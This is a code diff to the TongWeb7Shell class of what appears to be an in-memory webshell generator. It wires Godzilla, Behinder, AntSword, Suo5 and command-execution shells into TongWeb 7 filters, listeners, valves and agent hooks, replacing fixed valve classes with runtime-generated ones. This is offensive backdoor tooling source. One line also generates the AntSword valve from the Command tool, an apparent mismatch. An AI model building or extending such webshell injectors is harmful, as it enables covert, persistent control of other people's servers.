@@ -1,8 +1,8 @@
 package com.reajason.javaweb.memshell.server;
 
 import com.reajason.javaweb.memshell.ShellTool;
-import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.generator.ListenerGenerator;
+import com.reajason.javaweb.memshell.generator.ValveGenerator;
 import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
 import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
 import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
@@ -12,12 +12,7 @@ import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
 import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
-import com.reajason.javaweb.memshell.tongweb.antsword.AntSwordValve7;
-import com.reajason.javaweb.memshell.tongweb.behinder.BehinderValve7;
-import com.reajason.javaweb.memshell.tongweb.command.CommandValve7;
-import com.reajason.javaweb.memshell.tongweb.godzilla.GodzillaValve7;
 import com.reajason.javaweb.memshell.tongweb.injector.*;
-import com.reajason.javaweb.memshell.tongweb.suo5.Suo5Valve7;
 
 import static com.reajason.javaweb.memshell.ShellType.*;
 
@@ -26,6 +21,7 @@ import static com.reajason.javaweb.memshell.ShellType.*;
  * @since 2024/12/27
  */
 public class TongWeb7Shell extends AbstractShell {
+
     @Override
     protected InjectorMapping getShellInjectorMapping() {
         return InjectorMapping.builder()
@@ -44,56 +40,61 @@ public class TongWeb7Shell extends AbstractShell {
     protected void init() {
 
         Class<?> commandListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command);
+        Class<?> commandValveClass = ValveGenerator.generateValveClass(ValveGenerator.TONGWEB7_VALVE_PACKAGE, ShellTool.Command);
         addToolMapping(ShellTool.Command, ToolMapping.builder()
                 .addShellClass(FILTER, CommandFilter.class)
                 .addShellClass(JAKARTA_FILTER, CommandFilter.class)
                 .addShellClass(LISTENER, commandListenerClass)
                 .addShellClass(JAKARTA_LISTENER, commandListenerClass)
-                .addShellClass(VALVE, CommandValve7.class)
-                .addShellClass(JAKARTA_VALVE, CommandValve7.class)
+                .addShellClass(VALVE, commandValveClass)
+                .addShellClass(JAKARTA_VALVE, commandValveClass)
                 .addShellClass(AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
                 .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                 .build());
 
         Class<?> godzillaListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla);
+        Class<?> godzillaValveClass = ValveGenerator.generateValveClass(ValveGenerator.TONGWEB7_VALVE_PACKAGE, ShellTool.Godzilla);
         addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                 .addShellClass(FILTER, GodzillaFilter.class)
                 .addShellClass(JAKARTA_FILTER, GodzillaFilter.class)
                 .addShellClass(LISTENER, godzillaListenerClass)
                 .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
-                .addShellClass(VALVE, GodzillaValve7.class)
-                .addShellClass(JAKARTA_VALVE, GodzillaValve7.class)
+                .addShellClass(VALVE, godzillaValveClass)
+                .addShellClass(JAKARTA_VALVE, godzillaValveClass)
                 .addShellClass(AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
                 .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                 .build());
 
         Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder);
+        Class<?> behinderValveClass = ValveGenerator.generateValveClass(ValveGenerator.TONGWEB7_VALVE_PACKAGE, ShellTool.Behinder);
         addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                 .addShellClass(FILTER, BehinderFilter.class)
                 .addShellClass(JAKARTA_FILTER, BehinderFilter.class)
                 .addShellClass(LISTENER, behinderListenerClass)
                 .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
-                .addShellClass(VALVE, BehinderValve7.class)
-                .addShellClass(JAKARTA_VALVE, BehinderValve7.class)
+                .addShellClass(VALVE, behinderValveClass)
+                .addShellClass(JAKARTA_VALVE, behinderValveClass)
                 .addShellClass(AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                 .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                 .build());
 
         Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Suo5);
+        Class<?> suo5ValveClass = ValveGenerator.generateValveClass(ValveGenerator.TONGWEB7_VALVE_PACKAGE, ShellTool.Suo5);
         addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                 .addShellClass(FILTER, Suo5Filter.class)
                 .addShellClass(JAKARTA_FILTER, Suo5Filter.class)
                 .addShellClass(LISTENER, suo5ListenerClass)
                 .addShellClass(JAKARTA_LISTENER, suo5ListenerClass)
-                .addShellClass(VALVE, Suo5Valve7.class)
-                .addShellClass(JAKARTA_VALVE, Suo5Valve7.class)
+                .addShellClass(VALVE, suo5ValveClass)
+                .addShellClass(JAKARTA_VALVE, suo5ValveClass)
                 .build());
 
         Class<?> antSwordListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword);
+        Class<?> antSwordValveClass = ValveGenerator.generateValveClass(ValveGenerator.TONGWEB7_VALVE_PACKAGE, ShellTool.Command);
         addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                 .addShellClass(FILTER, AntSwordFilter.class)
                 .addShellClass(LISTENER, antSwordListenerClass)
-                .addShellClass(VALVE, AntSwordValve7.class)
+                .addShellClass(VALVE, antSwordValveClass)
                 .addShellClass(AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
                 .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                 .build());
